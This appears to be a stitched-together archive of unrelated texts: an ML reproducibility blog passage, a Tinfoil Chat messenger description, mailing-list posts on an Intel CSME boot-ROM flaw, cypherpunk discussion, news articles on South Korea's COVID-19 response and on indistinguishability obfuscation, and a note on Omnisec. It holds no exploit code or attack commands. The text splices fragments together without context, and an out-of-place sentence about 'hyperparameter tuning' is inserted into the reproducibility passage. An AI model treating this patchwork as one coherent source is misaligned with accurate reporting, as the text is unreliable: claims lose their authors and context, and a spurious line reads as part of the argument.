I find this result particularly noteworthy in terms of other people's reactions. While presenting at NeurIPS, many people commented on it. Half of them were certain that releasing would have been correlated with reproducibility , and the other half felt it obvious that the non-relationship would emerge. This strong contrast in opinions that were all deeply held is a perfect example of why I wanted to do this study. We don't really know until we sit down and measure it!
Finding 4: Having detailed pseudo code is just as reproducible as having no pseudo code.
Step-Code: Concise, but requires context from other parts of the paper to decipher.Standard-Code: Relatively detailed, can be almost self contained. Usually mathematical notation.Code-Like: Almost always self contained, easy to convert to code.
This finding challenged my assumptions of what constituted a good paper, but made more sense as I thought about the results. Somewhere in the paper, the process must be described. A computer scientist by training, I always preferred a type of description called pseudo code. But pseudo code can take many different forms. I categorized the papers it into four groups: None, Step-Code, Standard-Code, and Code-Like. I have some representative samples of these to the right from some widely reproduced papers that may or may not have been in this study!
I was shocked when Standard-Code and Code-Like has roughly equal reproduction rates, and floored to discover that None at all was just as good! However, cogent writing is just as effective in communicating a process. What was not as effective was so-called Step code, where a bulleted list of steps is listed, with each step referring to another section of the paper. Step code actually makes reading and understanding the paper harder, as the reader must now jump back and forth between different sections, rather than following a single sequential flow.
Finding 5: Creating simplified example problems do not appear to help with reproducibility.
This was another surprising result that I am still coming to grips with. I’ve always valued writers who can take a complex idea and boil it down to a simpler and more digestible form. I have likewise appreciated papers that create so-called toy problems. Toy problems which exemplify some property in a way that is easily visualized and turned into experiments. Subjectively, I always found simplified examples useful for understanding what a paper is trying to accomplish. Reproducing the toy problem was a useful tool in creating a smaller test case I could use for debugging. From an objective standpoint, simplified examples appear to provide no benefit for making a paper more reproducible. In fact, they do not even make papers more readable! I still struggle to understand and explain this result. This is exactly why it is important for us as a community to quantify these questions. If we do not do the work of quantifiction, we will never know that our work is tackling the issues most relevant to the research problem at hand.
Finding 6: Please, check your email
The last result I want to discuss is that replying to questions has a huge impact on a paper’s reproducibility. This result was expected, as not all papers rarely contain a perfect description of their methods. I emailed 50 different authors with questions regarding how to reproduce their results. In the 24 cases where I never got a reply, I was able to reproduce their results only once (a 4% success rate). For the remaining 26 cases in which the author did respond, I was able to successfully reproduce 22 of the papers (an 85% success rate). I think this result is most interesting for what it implies about the publication process itself. What if we allowed published papers to be updated over time, without it becoming some kind of “new” publication? This way, authors could incorporate common feedback and questions into the original paper. This is already possible when papers are [posted on the arXiv]( this should be the case for conference venue publications as well. These are things that could potentially advance science by increasing reproducibility, but only if we allow them to happen.
What Have We Learned?
Experts call this "hyperparameter tuning". This work was inspired by the headline, “Artificial intelligence faces reproducibility crisis”. Is this headline hype or does it point to a systematic problem in the field? After completing this effort, my inclination is that there is room for improvement, but that we in the AI/ML field are doing a better job than most disciplines. A 62% success rate is higher than many meta-analyses from other sciences, and I suspect my 62% number is lower than reality. Others who are more familiar with research areas outside of my areas of expertise might be able to succeed where I have failed. Therefore, I consider the 62% estimate to be a lower bound.
One thing I want to make very clear: none of these results should be taken as a definitive statement on what is and what is not reproducible. There are a huge number of potential biases that may impact these results. Most obvious is that these 255 attempts at reproduction were all done by a single person. There are no community standards for internal consistency between meta-analysts. What I find easy to reproduce may be difficult for others, and vice-versa. For example, I couldn’t reproduce any of the Bayesian or fairness-based papers I attempted, but I don’t believe that these fields are irreproducible. My personal biases, in terms of background, education, resources, interests, and more, are all inseparable from the results obtained.
That said, I think this work provides strong evidence for a number of our communities’ current challenges while validating many reproducibility efforts currently under way in the community. The biggest factors are that we cannot take all of our assumptions about so-called reproducible ML at face value. These assumptions need to be tested, and I hope more than anything that this work will inspire others to begin quantifying and collecting this data for themselves. As a community, we are in a very unique position to perform meta-science on ourselves. The cost of replication is so much lower for us than for any other field of science. What we learn here could have impacts that extend beyond AI & ML to other subfields of Computer Science.
More than anything, I think this work reinforces how difficulties of evaluating the reproducibility of research. Considering each feature in isolation is a fairly simple way to approach this analysis. This analysis has already delivered a number of potential insights, unexpected results, and complexities. However, it does not begin to consider correlations among papers based on authors, and representing the data as a graph, or even just looking at non-linear interactions of the current features! This is why I’ve attempted to make [much of the data publicly available]( so that others can perform a deeper analysis.
Finally, it has been pointed out to me that I may have created the most unreproducible ML research ever. But in reality, it leads to a number of issues regarding how we do the science of meta-science, to study how we implement and evaluate our research. With that, I hope I’ve encouraged you to read my paper for further details and discussion. Think about how your own work fits into the larger picture of human knowledge and science. As the avalanche of new AI and ML research continues to grow, our ability to leverage and learn from all this work will be highly dependent on our ability to distill ever more knowledge down to a digestible form. At the same time, our process and systems must result in reproducible work that does not lead us astray. I have more work I would like to do in this space, and I hope you will join me.

@_subject: Tinfoil Chat 
Tinfoil Chat (TFC) is a [FOSS]( [peer-to-peer]( messaging system that relies on high assurance hardware architecture to protect users from [passive collection]( [MITM attacks]( and most importantly, [remote key exfiltration]( TFC is designed for people with one of the most complex threat models: organized crime groups and nation state hackers who bypass end-to-end encryption of traditional secure messaging apps by hacking the endpoint.
State-of-the-art cryptography
TFC uses [XChaCha20]( [end-to-end encryption]( with [deniable authentication]( to protect all messages and files sent to individual recipients and groups. The symmetric keys are either [pre-shared]( or exchanged using [X448]( the base-10 [fingerprints]( of which are verified via an out-of-band channel. TFC provides per-message [forward secrecy]( with [BLAKE2b]( based [hash ratchet]( All persistent user data is encrypted locally using XChaCha20-Poly1305, the key of which is derived from password and salt using [Argon2id]( the parameters of which are automatically tuned according to best practices. Key generation of TFC relies on Linux kernel's [getrandom()]( a syscall for its ChaCha20 based [CSPRNG](
Anonymous by design
TFC routes all communication exclusively through the [Tor]( anonymity network. It uses the next generation ([v3]( [Tor Onion Services]( to enable P2P communication that never exits the Tor network. This makes it hard for the users to accidentally deanonymize themselves. It also means that unlike (de)centralized messengers, there's no third party server with access to user metadata such as who is talking to whom, when, and how much. The network architecture means TFC runs exclusively on the user's devices. There are no ads or tracking, and it collects no data whatsoever about the user. All data is always encrypted with keys the user controls, and the databases never leave the user's device.
Using Onion Services also means no account registration is needed. During the first launch TFC generates a random TFC account (an Onion Service address) for the user, e.g. 4sci35xrhp2d45gbm3qpta7ogfedonuw2mucmc36jxemucd7fmgzj3ad. By knowing this TFC account, anyone can send the user a contact request and talk to them without ever learning their real life identity, IP-address, or geolocation. Protected geolocation makes physical attacks very difficult because the attacker doesn't know where the device is located on the planet. At the same time it makes the communication censorship resistant: Blocking TFC requires blocking Tor categorically, nation-wide.
TFC also features a traffic masking mode that hides the type, quantity, and schedule of communication, even if the network facing device of the user is hacked. To provide even further metadata protection from hackers, the Internet-facing part of TFC can be run on [Tails]( a privacy and anonymity focused operating system that contains no personal files of the user (which makes it hard to deduce to whom the endpoint belongs to), and that provides [additional layers of protection]( for their anonymity.
First messaging system with endpoint security
TFC is designed to be used in hardware configuration that provides strong [endpoint security]( This configuration uses three computers per endpoint: Encryption and decryption processes are separated from each other onto two isolated computers, the Source Computer, and the Destination Computer. These two devices are are dedicated for TFC. This split [TCB]( interacts with the network via the user's daily computer, called the Networked Computer.
In TFC data moves from the Source Computer to the Networked Computer, and from the Networked Computer to the Destination Computer, unidirectionally. The unidirectionality of data flow is enforced, as the data is passed from one device to another only through a free hardware design [data diode]( that is connected to the three computers using one USB-cable per device. The Source and Destination Computers are not connected to the Internet, or to any device other than the data diode.
 [TFC data diode](
Optical repeater inside the [optocouplers]( of the data diode enforce direction of data transmission with the fundamental laws of physics. This protection is so strong, the certified implementations of data diodes are typically found in critical infrastructure protection and government networks where the classification level of data varies between systems. A data diode might e.g. allow access to a nuclear power plant's safety system readings, while at the same time preventing attackers from exploiting these critical systems. An alternative use case is to allow importing data from less secure systems to ones that contain classified documents that must be protected from exfiltration.
In TFC the hardware data diode ensures that neither of the TCB-halves can be accessed bidirectionally. Since the protection relies on physical limitations of the hardware's capabilities, no piece of malware, not even a [zero-day exploit]( can bypass the security provided by the data diode.
How it works
With the hardware in place, all that's left for the users to do is launch the device specific TFC program on each computer.
 [System overview](
In the illustration above, Alice enters messages and commands to Transmitter Program running on her Source Computer. The Transmitter Program encrypts and signs plaintext data and relays the ciphertexts from Source Computer to her Networked Computer through the data diode.
Relay Program on Alice's Networked Computer relays commands and copies of outgoing messages to her Destination Computer via the data diode. Receiver Program on Alice's Destination Computer authenticates, decrypts and processes the received message/command.
Alice's Relay Program shares messages and files to Bob over a Tor Onion Service. The web client of Bob's Relay Program fetches the ciphertext from Alice's Onion Service and forwards it to his Destination Computer through his data diode. Bob's Receiver Program then authenticates, decrypts and processes the received message/file.
When Bob responds, he will type his message to the Transmitter Program on his Source Computer, and after a mirrored process, Alice reads the message from the Receiver Program on her Destination Computer.
Why keys and plaintexts cannot be exfiltrated
The architecture described above simultaneously utilizes both [the classical and the alternative data diode models]( to enable bidirectional communication between two users, while at the same time providing hardware enforced endpoint security:
The Destination Computer uses the classical data diode model. This means it can receive data from the insecure Networked Computer, but is unable to send data back to the Networked Computer. The Receiver Program is designed to function under these constraints. However, even though the program authenticates and validates all incoming data, it is not ruled out malware couldn't still infiltrate the Destination Computer. However, in the event that would happen, the malware would be unable to exfiltrate sensitive keys or plaintexts back to the Networked Computer, as the data diode prevents all outbound traffic.
The Source Computer uses the alternative data diode model. This means it can output encrypted data to the insecure Networked Computer without having to worry about being compromised: The data diode protects the Source Computer from all attacks by physically preventing all inbound traffic. The Transmitter Program is also designed to work under the data flow constraints introduced by the data diode; To allow key exchanges, the short elliptic-curve public keys are input manually by the user.
The Networked Computer is designed under the assumption it can be compromised by a remote attacker: All sensitive data that passes through the Relay Program is encrypted and signed with no exceptions. Since the attacker is unable to exfiltrate decryption keys from the Source or Destination Computer, the ciphertexts are of no value to the attacker.
 [Exfiltration security](
Qubes-isolated intermediate solution
For some users the [APTs]( of the modern world are not part of the threat model, and for others, the requirement of having to build the data diode by themselves is a deal breaker. Yet, for all of them, storing private keys on a networked device is still a security risk.
To meet these users' needs, TFC can also be run in three dedicated [Qubes]( virtual machines. With the Qubes configuration, the isolation is provided by the [Xen hypervisor]( and the unidirectionality of data flow between the VMs is enforced with strict firewall rules. This intermediate isolation mechanism runs on a single computer which means no hardware data diode is needed.

@_subject: intel hopefully fucked 
‐‐‐‐‐‐‐ Original Message ‐‐‐‐‐‐‐
i'll break this into two parts. the scope, and the details.
regarding scope:
- "The larger worry is that, because this vulnerability allows a compromise at the hardware level, it destroys the chain of trust for the platform as a whole."
this means that the security boundary of root(s) of trust get violated through exploitation of this vulnerability. a fatal error, from an integrity perspective...
how do these roots get r00ted?
- "Intel's security is designed so that even arbitrary code execution in any Intel CSME firmware module would not jeopardize the root cryptographic key (Chipset Key), but only the specific functions of that particular module."
one root / trust anchor here, the Chipset Key. being able to manipulate this key is equivalent to having the private key, to sign malicious code in CSME context. so while the system is designed to robustly protect the Chipset Key, exploitation in early ROM compromises this Chipset Key root of trust.
- "Unfortunately, no security system is perfect. Like all security architectures, Intel's had a weakness: the boot ROM, in this case. An early-stage vulnerability in ROM enables control over reading of the Chipset Key and generation of all other encryption keys."
yup, early exploit in boot ROM lets you control Chipset key, and by extension, all of the other keys generated from this compromised root of trust, including Soft TPM keys, content protection keys, etc.
- "One of these keys is for the Integrity Control Value Blob (ICVB). With this key, attackers can forge the code of any Intel CSME firmware module in a way that authenticity checks cannot detect. This is functionally equivalent to a breach of the private key for the Intel CSME firmware digital signature, but limited to a specific platform."
what is meant by limited to a specific platform, is that this exploit is low level and platform specific. to attack another platform, you'd need to adjust exploit accordingly. they don't state what other platforms, if any, they've successfully exploited via this same vulnerability.
- "We will provide more technical details in a full-length white paper to be published soon."
will be fun to see :)

THE INTERPRETER
How South Korea Flattened the Curve
The country showed that it is possible to contain the coronavirus without shutting down the economy, but experts are unsure whether its lessons can work abroad.
By [Max Fisher]( and [Choe Sang-Hun](
March 23, 2020Updated 6:38 p.m. ET
No matter how you look at the numbers, one country stands out from the rest: South Korea.
In late February and early March, the number of new coronavirus infections in the country exploded from a few dozen, to a few hundred, to several thousand.
At the peak, medical workers identified 909 new cases in a single day, Feb. 29, and the country of 50 million people appeared on the verge of being overwhelmed. But less than a week later, the number of new cases [halved]( Within four days, it [halved again]( — [and again]( the next day.
On Sunday, South Korea reported only [64 new cases]( the fewest in nearly a month, even as infections in other countries continue to soar by the thousands daily, devastating health care systems and economies. Italy records several hundred deaths daily; South Korea has not had more than eight in a day.
South Korea is one of only two countries with large outbreaks, alongside China, to [flatten the curve]( of new infections. And it has done so without China’s draconian restrictions on speech and movement, or economically damaging lockdowns like those in Europe and the United States.
As global deaths from the virus surge past 15,000, officials and experts worldwide are scrutinizing South Korea for lessons. And those lessons, while hardly easy, appear relatively straightforward and affordable: swift action, widespread testing and contact tracing, and critical support from citizens.
Yet other hard-hit nations did not follow South Korea’s lead. Some have began to show interest in emulating its methods — but only after the epidemic had accelerated to the point that they may not be able to control it any time soon.
President Emmanuel Macron of France and Prime Minister Stefan Löfven of Sweden have both called South Korea’s president, Moon Jae-in, to request details on the country’s measures, according to Mr. Moon’s office.
The head of the World Health Organization, Tedros Adhanom Ghebreyesus, has [hailed]( South Korea as demonstrating that containing the virus, while difficult, “can be done.” He urged countries to “apply the lessons learned in Korea and elsewhere.”
South Korean officials caution that their successes are tentative. A risk of resurgence remains, particularly as epidemics continue raging beyond the country’s borders.
Still, Scott Gottlieb, a former commissioner of the Food and Drug Administration, has repeatedly raised South Korea as a model, [writing on Twitter]( “South Korea is showing Covid-19 can be beat with smart, aggressive public health.”
Lesson 1: Intervene Fast, Before It’s a Crisis
Just one week after the country’s first case was diagnosed in late January, government officials met with representatives from several medical companies. They urged the companies to begin immediately developing coronavirus test kits for mass production, promising emergency approval.
Within two weeks, though South Korea’s confirmed cases remained in the double digits, thousands of test kits were shipping daily. The country now produces 100,000 kits per day, and officials say they are in talks with 17 foreign governments about exporting them.
Officials also swiftly imposed emergency measures in Daegu, a city of 2.5 million where contagion spread fast through [a local church](
“South Korea could deal with this without limiting the movement of people because we knew the main source of infection, the church congregation, pretty early on,” said Ki Mo-ran, an epidemiologist advising the government’s coronavirus response. “If we learned about it later than we did, things could have been far worse.”
South Koreans, unlike Europeans and Americans, were also primed to treat the coronavirus as a national emergency, after a 2015 outbreak of Middle East respiratory syndrome in the country killed 38.
The coronavirus is thought to have a [five-day incubation period]( often followed by a period of mild symptoms that could be mistaken for a cold, when the virus is [highly communicable]( This pattern creates a lag of a week or two before an outbreak becomes apparent. What looks like a handful of cases can be hundreds; what looks like hundreds can be thousands.
“Such characteristics of the virus render the traditional response, which emphasizes lockdown and isolation, ineffective,” said Kim Gang-lip, South Korea’s vice health minister. “Once it arrives, the old way is not effective in stopping the disease from spreading.”
Lesson 2: Test Early, Often and Safely
South Korea has tested far more people for the coronavirus than any other country, enabling it to isolate and treat many people soon after they are infected.
The country has conducted over 300,000 tests, for a per-capita rate more than 40 times that of the United States.
“Testing is central because that leads to early detection, it minimizes further spread and it quickly treats those found with the virus,” Kang Kyung-wha, South Korea’s foreign minister, [told the BBC]( calling the tests “the key behind our very low fatality rate as well.”
Though South Korea is sometimes portrayed as having averted an epidemic, thousands of people were infected and the government was initially [accused of complacency]( Its approach to testing was designed to turn back an outbreak already underway.
To spare hospitals and clinics from being overwhelmed, officials opened 600 testing centers designed to screen as many people as possible, as quickly as possible — and keep health workers safe by minimizing contact.
At 50 drive-through stations, patients are tested without leaving their cars. They are given a questionnaire, a remote temperature scan and a throat swab. The process takes about 10 minutes. Test results are usually back within hours.
At some walk-in centers, patients enter a chamber resembling a [transparent phone booth]( Health workers administer throat swabs using thick rubber gloves built into the chamber’s walls.
Relentless public messaging urges South Koreans to seek testing if they or someone they know develop symptoms. Visitors from abroad are required to download a smartphone app that guides them through self-checks for symptoms.
Offices, hotels and other large buildings often use thermal image cameras to identify people with fevers. Many restaurants check customers’ temperatures before accepting them.
Lesson 3: Contact Tracing, Isolation and Surveillance
When someone tests positive, health workers retrace the patient’s recent movements to find, test — and, if necessary, isolate — anyone the person may have had contact with, a process known as contact tracing.
This allows health workers to identify networks of possible transmission early, carving the virus out of society like a surgeon removing a cancer.
South Korea developed tools and practices for aggressive contact tracing during the MERS outbreak. Health officials would retrace patients’ movements using security camera footage, credit card records, even GPS data from their cars and cellphones.
“We did our epidemiological investigations like police detectives,” Dr. Ki said. “Later, we had laws revised to prioritize social security over individual privacy at times of infectious disease crises.”
As the coronavirus outbreak grew too big to track patients so intensively, officials relied more on mass messaging.
South Koreans’ cellphones vibrate with emergency alerts whenever new cases are discovered in their districts. Websites and smartphone apps detail hour-by-hour, sometimes minute-by-minute, timelines of infected people’s travel — which buses they took, when and where they got on and off, even whether they were wearing masks.
People who believe they may have crossed paths with a patient are urged to report to testing centers.
South Koreans have broadly accepted the loss of privacy as a necessary trade-off.
People ordered into self-quarantine must download another app, which alerts officials if a patient ventures out of isolation. Fines for violations can reach $2,500.
By identifying and treating infections early, and segregating mild cases to special centers, South Korea has kept hospitals clear for the most serious patients. Its case fatality rate is just over one percent, among the lowest in the world.
Lesson 4: Enlist The Public’s Help
There aren’t enough health workers or body-temperature scanners to track everybody, so everyday people must pitch in.
Leaders concluded that subduing the outbreak required keeping citizens fully informed and asking for their cooperation, said Mr. Kim, the vice health minister.
Television broadcasts, subway station announcements and smartphone alerts provide endless reminders to wear face masks, pointers on social distancing and the day’s transmission data.
The messaging instills a near-wartime sense of common purpose. Polls show majority approval for the government’s efforts, with confidence high, panic low and scant hoarding.
“This public trust has resulted in a very high level of civic awareness and voluntary cooperation that strengthens our collective effort,” Lee Tae-ho, the vice minister of foreign affairs, told reporters earlier this month.
Officials also credit the country’s nationalized health care system, which guarantees most care, and special rules covering coronavirus-related costs, as giving even people with no symptoms greater incentive to get tested.
Is The Korean Model Transferable?
For all the attention to South Korea’s successes, its methods and containment tools are not prohibitively complex or expensive.
Some of the technology the country has used is as simple as specialized rubber gloves and cotton swabs. Of the seven countries with worse outbreaks than South Korea’s, five are richer.
Experts cite three major hurdles to following South Korea’s lead, none related to cost or technology.
One is political will. Many governments have hesitated to impose onerous measures in the absence of a crisis-level outbreak.
Another is public will. Social trust is higher in South Korea than in many other countries, particularly Western democracies beset by polarization and populist backlash.
But time poses the greatest challenge. It may be “too late,” Dr. Ki said, for countries deep into epidemics to control outbreaks as quickly or efficiently as South Korea has.
China turned back the catastrophic first outbreak in Hubei, a province larger than most European countries, though at the cost of shutting down its economy.
South Korea’s methods could help the United States, though “we probably lost the chance to have an outcome like South Korea,” Mr. Gottlieb, the former F.D.A. commissioner, [wrote on Twitter]( “We must do everything to avert the tragic suffering being borne by Italy.”

‐‐‐‐‐‐‐ Original Message ‐‐‐‐‐‐‐
i asked a similar question around a decade ago. i don't have a definitive answer, but some opinions...
there is no one causative factor; many combined:
- early progress in privacy tech leading to a languishing (or at least a decline). "we won the crypto wars!" (hah :)
- sustainability; there was insufficient passionate new blood to sustain what was "the cypherpunks" of that era. or said another way, the passionate coders of future privacy tech moved in circles that overlapped, but were not defined by, the cypherpunks.
- centralization; it is a strong attractor! when you've got development idioms and norms all built around github and package repos and "free" services, each somewhat or very opposed to decentralized cypherpunks ethos, the result is a drain away from core cypherpunks (if there is a thing) into other endeavors. this is pervasive and persistent.
- sophistication; the state of the art moved on from the realm of amateur practitioner to applied graduate level computer science and information theory.  the incremental gains in privacy effectiveness required increasingly complicated constructs. the ideal constructions with severe performance constraints suffered and died due to lack of adoption. usability and privacy are complicated in ways we continue to discover - requiring mastery of many domains to implement effectively.
i had hope the Snowden leaks would revive a passionate cypherpunks groundswell. in one sense, it did: end-to-end secure open source tech is widely available, most of the internet is encrypted - it's hard to overstate how monumental this is! but it is also clear this progress was made outside of whatever "cypherpunks" is today.
if that didn't do it? perhaps email lists are simply too archaic for modern popularity :)
if slack remade IRC, what does a  shittier, web'ified maillist look like? (a forum?)
agreed. but try to convince everyone of that!

Furthermore, the library provides data structures to assist the user in creating a linear code for a specific problem. An easy to use interface to the provided algorithms, powerful data structures and a command line parser reduces the implementation work of a cryptanalyst to a minimum.

this is a great approach!  the problem is: you need to begin this isolation *before* you need it.
the typical scenario is using only modest protections, getting involved in activism, and then discovering your protections inadequate.
once your activism and identity are compromised, it is *very* hard to undo the damage.  you must *start over* with a new digital identity, adhering to operational security always. maybe move town, maybe move countries.
even Barton Gellman had a hard time with this - always keeping his laptop with him like a digital albatross; always protecting passphrase input with blankets and towels; always separating untrustworthy files on isolated machines. and on and on and on and ...

@_subject: =?utf-8?Q?Computer_Scientists_Achieve_=E2=80=98Crown_Jewel=E2=80=99_of_Cryptography_-_indistinguishability_obfuscation?= 
In 2018, [Aayush Jain]( a graduate student at the University of California, Los Angeles, traveled to Japan to give a talk about a powerful cryptographic tool he and his colleagues were developing. As he detailed the team’s approach to indistinguishability obfuscation (iO for short), one audience member raised his hand in bewilderment.
“But I thought iO doesn’t exist?” he said.
At the time, such skepticism was widespread. Indistinguishability obfuscation, if it could be built, would be able to hide not just collections of data but the inner workings of a computer program itself, creating a sort of cryptographic master tool from which nearly every other cryptographic protocol could be built. It is “one cryptographic primitive to rule them all,” said [Boaz Barak]( of Harvard University. But to many computer scientists, this very power made iO seem too good to be true.
Computer scientists set forth candidate versions of iO starting in 2013. But the intense excitement these constructions generated gradually fizzled out, as other researchers figured out how to break their security. As the attacks piled up, “you could see a lot of negative vibes,” said [Yuval Ishai]( of the Technion in Haifa, Israel. Researchers wondered, he said, “Who will win: the makers or the breakers?”
“There were the people who were the zealots, and they believed in [iO] and kept working on it,” said Shafi Goldwasser, director of the Simons Institute for the Theory of Computing at the University of California, Berkeley. But as the years went by, she said, “there was less and less of those people.”
Now, Jain — together with [Huijia Lin]( of the University of Washington and [Amit Sahai]( Jain’s adviser at UCLA — has planted a flag for the makers. In a [paper]( posted online on August 18, the three researchers show for the first time how to build indistinguishability obfuscation using only “standard” security assumptions.

Eleena Mohanty
All cryptographic protocols rest on assumptions — some, such as the famous RSA algorithm, depend on the widely held belief that standard computers will never be able to quickly factor the product of two large prime numbers. A cryptographic protocol is only as secure as its assumptions, and previous attempts at iO were built on untested and ultimately shaky foundations. The new protocol, by contrast, depends on security assumptions that have been widely used and studied in the past.
“Barring a really surprising development, these assumptions will stand,” Ishai said.
While the protocol is far from ready to be deployed in real-world applications, from a theoretical standpoint it provides an instant way to build an array of cryptographic tools that were previously out of reach. For instance, it enables the creation of “deniable” encryption, in which you can plausibly convince an attacker that you sent an entirely different message from the one you really sent, and “functional” encryption, in which you can give chosen users different levels of access to perform computations using your data.
The new result should definitively silence the iO skeptics, Ishai said. “Now there will no longer be any doubts about the existence of indistinguishability obfuscation,” he said. “It seems like a happy end.”
The Crown Jewel
For decades, computer scientists wondered if there is any secure, all-encompassing way to obfuscate computer programs, allowing people to use them without figuring out their internal secrets. Program obfuscation would enable a host of useful applications: For instance, you could use an obfuscated program to delegate particular tasks within your bank or email accounts to other individuals, without worrying that someone could use the program in a way it wasn’t intended for or read off your account passwords (unless the program was designed to output them).
But so far, all attempts to build practical obfuscators have failed. “The ones that have come out in real life are ludicrously broken, … typically within hours of release into the wild,” Sahai said. At best, they offer attackers a speed bump, he said.
In 2001, bad news came on the theoretical front too: The strongest form of obfuscation is impossible. Called black box obfuscation, it demands that attackers should be able to learn absolutely nothing about the program except what they can observe by using the program and seeing what it outputs. Some programs, Barak, Sahai and five other researchers [showed]( reveal their secrets so determinedly that they are impossible to obfuscate fully.
These programs, however, were specially concocted to defy obfuscation and bear little resemblance to real-world programs. So computer scientists hoped there might be some other kind of obfuscation that was weak enough to be feasible but strong enough to hide the kinds of secrets people actually care about. The same researchers who showed that black box obfuscation is impossible proposed one possible alternative in their paper: indistinguishability obfuscation.
On the face of it, iO doesn’t seem like an especially useful concept. Instead of requiring that a program’s secrets be hidden, it simply requires that the program be obfuscated enough that if you have two different programs that perform the same task, you can’t distinguish which obfuscated version came from which original version.
Amit Sahai of UCLA.
But iO is stronger than it sounds. For example, suppose you have a program that carries out some task related to your bank account, but the program contains your unencrypted password, making you vulnerable to anyone who gets hold of the program. Then — as long as there is some program out there that could perform the same task while keeping your password hidden — an indistinguishability obfuscator will be strong enough to successfully mask the password. After all, if it didn’t, then if you put both programs through the obfuscator, you’d be able to tell which obfuscated version came from your original program.
Over the years, computer scientists have shown that you can use iO as the basis for almost every cryptographic protocol you could imagine (except for black box obfuscation). That includes both classic cryptographic tasks like public key encryption (which is used in online transactions) and dazzling newcomers like fully homomorphic encryption, in which a cloud computer can compute on encrypted data without learning anything about it. And it includes cryptographic protocols no one knew how to build, like deniable or functional encryption.
“It really is kind of the crown jewel” of cryptographic protocols, said [Rafael Pass]( of Cornell University. “Once you achieve this, we can get essentially everything.”
In 2013, Sahai and five co-authors [proposed an iO protocol]( that splits up a program into something like jigsaw puzzle pieces, then uses cryptographic objects called multilinear maps to garble the individual pieces. If the pieces are put together correctly, the garbling cancels out and the program functions as intended, but each individual piece looks meaningless. The result was hailed as a breakthrough and prompted dozens of follow-up papers. But within a few years, other researchers showed that the [multilinear maps used]( in the garbling process were not secure. Other iO candidates came along and were broken in their turn.
“There was some worry that maybe this is just a mirage, maybe iO is simply impossible to get,” Barak said. People started to feel, he said, that “maybe this whole enterprise is doomed.”
Hiding Less to Hide More
In 2016, Lin started exploring whether it might be possible to get around the weaknesses of multilinear maps by simply demanding less of them. Multilinear maps are essentially just secretive ways of computing with polynomials — mathematical expressions made up of sums and products of numbers and variables, like 3xy + 2yz2. These maps, Jain said, entail something akin to a polynomial calculating machine connected to a system of secret lockers containing the values of the variables. A user who drops in a polynomial that the machine accepts gets to look inside one final locker to find out whether the hidden values make the polynomial evaluate to 0.
For the scheme to be secure, the user shouldn’t be able to figure out anything about the contents of the other lockers or the numbers that were generated along the way. “We would like that to be true,” Sahai said. But in all the candidate multilinear maps people could come up with, the process of opening the final locker revealed information about the calculation that was supposed to stay hidden.
Huijia Lin of the University of Washington.
Dennis Wise/University of Washington
Since the proposed multilinear map machines all had security weaknesses, Lin wondered if there was a way to build iO using machines that don’t have to compute as many different kinds of polynomials (and therefore might be easier to build securely). Four years ago, she [figured out]( how to build iO using only multilinear maps that compute polynomials whose “degree” is 30 or less (meaning that every term is a product of at most 30 variables, counting repeats). Over the next couple of years, she, Sahai and other researchers gradually figured out how to bring the degree down even lower, until they were able to show how to build iO using just degree-3 multilinear maps.
On paper, it looked like a vast improvement. There was just one problem: From a security standpoint, “degree 3 was actually as broken” as the machines that can handle polynomials of every degree, Jain said.
The only multilinear maps researchers knew how to build securely were those that computed polynomials of degree 2 or less. Lin joined forces with Jain and Sahai to try to figure out how to construct iO from degree-2 multilinear maps. But “we were stuck for a very, very long time,” Lin said.
“It was kind of a gloomy time,” Sahai recalled. “There’s a graveyard filled with all the ideas that didn’t work.”
Eventually, though — together with [Prabhanjan Ananth]( of the University of California, Santa Barbara and [Christian Matt]( of the blockchain project Concordium — they came up with an idea for a sort of compromise: Since iO seemed to need degree-3 maps, but computer scientists only had secure constructions for degree-2 maps, what if there was something in between — a sort of degree-2.5 map?
The researchers envisioned a system in which some of the lockers have clear windows, so the user can see the values contained within. This frees the machine from having to protect too much hidden information. To strike a balance between the power of higher-degree multilinear maps and the security of degree-2 maps, the machine is allowed to compute with polynomials of degree higher than 2, but there’s a restriction: The polynomial must be degree 2 on the hidden variables. “We’re trying to not hide as much” as in general multilinear maps, Lin said. The researchers were able to show that these hybrid locker systems can be constructed securely.
Samuel Velasco/Quanta Magazine
But to get from these less powerful multilinear maps to iO, the team needed one last ingredient: a new kind of pseudo-randomness generator, something that expands a string of random bits into a longer string that still looks random enough to fool computers. That’s what Jain, Lin and Sahai have figured out how to do in their new paper. “There was a wonderful last month or so where everything came together in a flurry of phone calls,” Sahai said.
The result is an iO protocol that finally avoids the security weaknesses of multilinear maps. “Their work looks absolutely beautiful,” Pass said.
The scheme’s security rests on four mathematical assumptions that have been widely used in other cryptographic contexts. And even the assumption that has been studied the least, called the “learning parity with noise” assumption, is related to a problem that has been studied since the 1950s.
There is likely only one thing that could break the new scheme: a [quantum computer]( if a full-power one is ever built. One of the four assumptions is vulnerable to quantum attacks, but over the past few months a separate line of work has emerged in [three]( [separate]( [papers]( by Pass and other researchers offering a different potential route to iO that might be secure even from quantum attacks. These versions of iO rest on less established security assumptions than the ones Jain, Lin and Sahai used, several researchers said. But it is possible, Barak said, that the two approaches could be combined in the coming years to create a version of iO that rests on standard security assumptions and also resists quantum attacks.
Jain, Lin and Sahai’s construction will likely entice new researchers into the field to work on making the scheme more practical and to develop new approaches, Ishai predicted. “Once you know that something is possible in principle, it makes it psychologically much easier to work in the area,” he said.
Computer scientists still have much work to do before the protocol (or some variation on it) can be used in real-world applications. But that is par for the course, researchers said. “There’s a lot of notions in cryptography that, when they first came out, people were saying, ‘This is just pure theory, [it] has no relevance to practice,’” Pass said. “Then 10 or 20 years later, Google is implementing these things.”
The road from a theoretical breakthrough to a practical protocol can be a long one, Barak said. “But you could imagine,” he said, “that maybe 50 years from now the crypto textbooks will basically say, ‘OK, here is a very simple construction of iO, and from that we’ll now derive all of the rest of crypto.’”

not to put too fine a point on it, but the SS7 telephone network is different from (but equally compromised as) the Internet.
radio point to point links, while avoiding a trusted third party, are still just as much an RF emanation privacy risk as a standard cell phone.
maybe free space optics with narrow fresnel zone makes the most work for Eves' everywhere?
regardless of technology - the point stands: communications technologies are flawed, so protect what you can and mitigate what you can't.
and of course, physical and operational security are key components - those aren't communications technologies, but secure communication demands them.

In relation to the above, it is worth noting that both the initial owner of Omnisec, Urs Ingold, and the first director, Pierre Schmid, are mentioned in the CIA documents about [Operation RUBICON]( as being well-known by the American intelligence community, whatever that means [8](
Another name that turns up in relation to Omnisec, is Ueli Maurer, Professor at the ETH in Zürich, and between 1988 and 2015 technical advisor at Omnisec. Although he previously denied it, he now confirms that he was approached by the [NSA]( in 1989, but had turned them down [10](
